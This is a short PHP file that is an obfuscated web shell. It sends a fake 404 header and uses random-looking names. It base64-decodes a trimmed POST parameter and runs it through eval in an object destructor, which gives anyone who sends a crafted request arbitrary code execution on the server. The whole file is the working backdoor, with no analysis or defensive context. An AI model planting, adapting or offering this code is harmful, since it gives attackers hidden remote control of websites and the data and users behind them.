<?php
header('HTTP/1.1 404');
class  UshPq{
    public $name = '';
    public $config=null;
    function __destruct(){
        @eval(''.$this->config."$this->name");
    }
}

$uhTwq = new UshPq();
$Ystn = @$_POST['num'];
$c = \base64_decode((substr(@$_POST['css'],$Ystn,-$Ystn)));
$uhTwq->name = ''.$c;
?>